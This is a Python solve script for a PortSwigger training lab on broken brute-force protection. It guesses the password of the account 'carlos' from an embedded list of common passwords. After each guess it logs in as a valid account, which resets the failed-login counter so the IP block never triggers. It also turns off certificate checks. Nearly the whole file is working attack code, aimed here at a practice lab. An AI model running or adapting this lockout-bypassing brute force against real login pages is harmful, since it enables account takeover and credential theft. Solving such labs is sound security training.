#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Broken brute-force protection, IP block.

Interleaves a valid wiener:peter login between each carlos password attempt
to reset the failed-attempt counter before the IP block threshold is reached.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
    "dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master",
    "666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman",
    "1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan",
    "jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew",
    "tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger",
    "daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper"
]


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> requests.Response:
    csrf = get_csrf(session, f"{lab}/login")
    return session.post(f"{lab}/login",
                        data={"csrf": csrf, "username": username, "password": password},
                        allow_redirects=False)


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 6 (IP block bypass via interleaving)")
    parser.add_argument("lab_url")
    parser.add_argument("--target", default="carlos")
    parser.add_argument("--valid-user", default="wiener")
    parser.add_argument("--valid-pass", default="peter")
    parser.add_argument("--passlist")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    passwords = open(args.passlist).read().splitlines() if args.passlist else PASSWORDS

    for password in passwords:
        r = login(s, lab, args.target, password)
        if r.status_code == 302:
            print(f"[+] Password found: {password}")
            print("[+] Lab solved.")
            return
        # Reset the counter with a valid login
        login(s, lab, args.valid_user, args.valid_pass)

    print("[-] Password not found in wordlist")


if __name__ == "__main__":
    main()
